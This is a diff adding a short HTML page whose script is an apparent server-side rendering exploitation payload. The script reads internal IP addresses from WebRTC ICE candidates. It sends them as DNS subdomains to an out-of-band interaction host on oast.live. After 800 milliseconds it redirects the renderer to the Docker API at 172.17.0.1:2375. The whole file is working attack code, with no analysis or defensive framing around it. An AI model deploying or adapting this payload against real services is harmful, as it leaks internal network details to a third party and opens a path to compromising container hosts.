@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head><title>t</title></head>
+<body>
+<script>
+var OOB = 'd9qsljr6b8mev06je2705b8w3x6juud75.oast.live';
+function dns(label) {
+  var l = label.toLowerCase().replace(/[^a-z0-9-]/g,'-').replace(/-+/g,'-').replace(/^-|-$/g,'').substring(0,60);
+  new Image().src = 'https://' + l + '.' + OOB + '/';
+}
+
+dns('v15-start');
+
+// WebRTC ICE: leaks actual internal IP of renderer host
+try {
+  var pc = new RTCPeerConnection({iceServers: []});
+  pc.createDataChannel('x');
+  pc.onicecandidate = function(e) {
+    if (e.candidate && e.candidate.candidate) {
+      var m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/g);
+      if (m) m.forEach(function(ip) { dns('ice-' + ip.replace(/\./g,'-')); });
+    }
+  };
+  pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
+} catch(e) { dns('ice-exc-' + (e.name||'').substring(0,6)); }
+
+// After 800ms redirect to Docker API on bridge
+setTimeout(function() {
+  dns('v15-redir-docker');
+  window.location.href = 'http://172.17.0.1:2375/v1.41/version';
+}, 800);
+</script>
+</body>
+</html>
